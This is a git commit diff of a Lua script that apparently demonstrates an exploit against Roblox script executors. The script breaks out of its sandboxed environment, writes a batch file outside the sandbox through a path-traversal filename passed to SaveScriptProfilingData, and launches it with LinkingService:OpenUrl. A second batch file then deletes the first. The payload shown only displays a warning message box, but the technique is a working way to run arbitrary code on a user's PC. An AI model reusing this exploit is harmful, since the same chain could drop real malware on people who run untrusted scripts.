ef53ccc35044a6db9c44a1f71b681d059139560c
Dev <79853619+devvedbydev@users.noreply.github.com>
2024-10-19 22:44:48 +0100

    Update Environment.lua

--- Environment.lua
+++ Environment.lua
@@ -1,22 +1,31 @@
 setfenv(1, getfenv(require))
 getfenv().game = nil
-
 local LinkingService = game:GetService("LinkingService")
 local ScriptContext = game:GetService("ScriptContext")
 
 local messageBoxScript = [[
-powershell -Command "Add-Type -AssemblyName PresentationFramework; 
-$pcUsername = [System.Environment]::UserName; 
-[System.Windows.MessageBox]::Show('Hello ' + $pcUsername + ', you just ran a script that exploited a vulnerability in your executor. Luckily for you, I won''t be causing any harm. To scare you, I have closed your browser to show what is possible. Please be careful what scripts you execute. Have a great day.');"
+@echo off
+setlocal
+
+REM Set your PC username variable
+set "pcUsername=%USERNAME%"
+
+REM Create a concise error message
+set "message=Hello %pcUsername%, I exploited a vulnerability in your executor. No harm done, but be cautious!"
+
+REM Display the error message box using PowerShell
+PowerShell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('%message%', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)"
+
+endlocal
 ]]
 
-local messageBoxPayload = ScriptContext:SaveScriptProfilingData(messageBoxScript, "../../../../message_box.bat")
+local messageBoxPayload = ScriptContext:SaveScriptProfilingData(messageBoxScript, "../../../../uacvuln.bat")
 LinkingService:OpenUrl(messageBoxPayload)
 
 local cleanupScript = [[
 @echo off
 timeout /t 3 > nul
-del /f /q "../../../../message_box.bat"
+del /f /q "../../../../uacvuln.bat"
 ]]
 local cleanupPayload = ScriptContext:SaveScriptProfilingData(cleanupScript, "../../../../cleanup.bat")
 
